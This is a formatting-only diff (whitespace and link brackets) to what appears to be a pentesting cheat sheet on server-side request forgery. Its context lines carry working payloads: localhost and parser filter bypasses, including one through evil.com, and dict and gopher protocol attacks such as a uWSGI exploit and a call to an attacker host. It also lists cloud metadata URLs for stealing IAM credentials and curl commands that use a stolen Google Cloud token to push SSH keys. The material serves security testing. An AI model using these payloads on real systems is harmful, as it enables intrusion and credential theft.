@@ -120,7 +120,7 @@ The service nip.io is awesome for that, it will convert any ip address as a dns.
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
 ```
 
-### Bypass localhost with CIDR 
+### Bypass localhost with CIDR
 
 It's a /8
 
@@ -173,7 +173,7 @@ http://127.0.0.1/%61dmin
 http://127.0.0.1/%2561dmin
 ```
 
-### Bypass using bash variables 
+### Bypass using bash variables
 
 (curl only)
 
@@ -191,7 +191,7 @@ requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
 
-### Bypass using enclosed alphanumerics 
+### Bypass using enclosed alphanumerics
 
 [@EdOverflow](https://twitter.com/EdOverflow)
 
@@ -205,7 +205,7 @@ List:
 ### Bypass filter_var() php function
 
 ```powershell
-0://evil.com:80;http://google.com:80/ 
+0://evil.com:80;http://google.com:80/
 ```
 
 ### Bypass against a weak parser
@@ -222,6 +222,7 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
 ### Bypassing using a redirect
+
 [using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
 
 ```powershell
@@ -248,7 +249,7 @@ make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 
 ## SSRF exploitation via URL Scheme
 
-### File 
+### File
 
 Allows an attacker to fetch the content of a file on the server
 
@@ -282,7 +283,7 @@ dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 ```
 
-### SFTP 
+### SFTP
 
 A network protocol used for secure file transfer over secure shell
 
@@ -378,7 +379,7 @@ ssrf.php?url=gopher://127.0.0.1:4242/DATA
 
 ## SSRF exploiting WSGI
 
-Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
+Exploit using the Gopher protocol, full exploit script available at <https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py>.
 
 ```powershell
 gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
@@ -396,8 +397,7 @@ gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
 | key data              | (m bytes) |    | UWSGI_FILE |   |
 | value length          | (2 bytes) | 12 | (%0C%00)   |   |
 | value data            | (n bytes) |    | /tmp/test.py   |   |
-	
-
+ 
 ## SSRF exploiting Redis
 
 > Redis is a database system that stores everything in RAM
@@ -424,7 +424,7 @@ Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR
 <link rel=attachment href="file:///root/secret.txt">
 ```
 
-## SSRF to XSS 
+## SSRF to XSS
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
 
@@ -447,7 +447,7 @@ The content of the file will be integrated inside the PDF as an image or text.
 
 ### Using an attachment
 
-Example of a PDF attachment using HTML 
+Example of a PDF attachment using HTML
 
 1. use `<link rel=attachment href="URL">` as Bio text
 2. use 'Download Data' feature to get PDF
@@ -549,7 +549,6 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbean
 
 Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
 
-
 ### SSRF URL for AWS Lambda
 
 AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.
@@ -559,7 +558,7 @@ http://localhost:9001/2018-06-01/runtime/invocation/next
 $ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
 ```
 
-Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
+Docs: <https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next>
 
 ### SSRF URL for Google Cloud
 
@@ -614,21 +613,21 @@ Check the scope of the token
 ```powershell
 $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
 
-{ 
-        "issued_to": "101302079XXXXX", 
-        "audience": "10130207XXXXX", 
-        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
-        "expires_in": 2443, 
-        "access_type": "offline" 
+{
+        "issued_to": "101302079XXXXX",
+        "audience": "10130207XXXXX",
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
+        "expires_in": 2443,
+        "access_type": "offline"
 }
 ```
 
 Now push the SSH key.
 
 ```powershell
-curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
--H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
--H "Content-Type: application/json" 
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
+-H "Content-Type: application/json"
 --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
 ```
 
@@ -639,7 +638,7 @@ Documentation available at `https://developers.digitalocean.com/documentation/me
 ```powershell
 curl http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1.json
-http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/
 http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1/user-data
 http://169.254.169.254/metadata/v1/hostname
@@ -682,7 +681,7 @@ http://169.254.169.254/openstack
 (header required? unknown)
 
 ```powershell
-http://169.254.169.254/2009-04-04/meta-data/ 
+http://169.254.169.254/2009-04-04/meta-data/
 ```
 
 ### SSRF URL for Oracle Cloud
@@ -724,8 +723,8 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 
 More info:
 
-- Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
-- Docker Engine API: https://docs.docker.com/engine/api/latest/
+- Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>
+- Docker Engine API: <https://docs.docker.com/engine/api/latest/>
 
 ### SSRF URL for Rancher
 
@@ -733,8 +732,7 @@ More info:
 curl http://rancher-metadata/<version>/<path>
 ```
 
-More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
-
+More info: <https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/>
 
 ## References
 
